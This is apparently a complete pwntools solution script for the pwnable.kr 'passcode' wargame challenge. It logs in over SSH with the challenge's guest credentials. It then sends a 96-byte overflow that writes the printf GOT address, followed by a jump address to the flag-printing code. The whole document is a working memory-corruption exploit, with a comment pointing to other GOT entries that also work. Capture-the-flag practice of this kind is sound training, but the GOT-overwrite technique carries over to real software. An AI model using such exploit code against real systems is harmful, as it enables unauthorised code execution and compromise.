from pwn import *

s = ssh(host='pwnable.kr',
        port=2222,
        user='passcode',
        password='guest')

s.download('passcode')

e=ELF('./passcode')

sh = s.process('passcode')
sh.readline()
sh.sendline('A'*96+p32(e.got['printf']))#you can use also scanf and fflush
sh.readline()
sh.sendline(str(0x80485E3))
print sh.readline()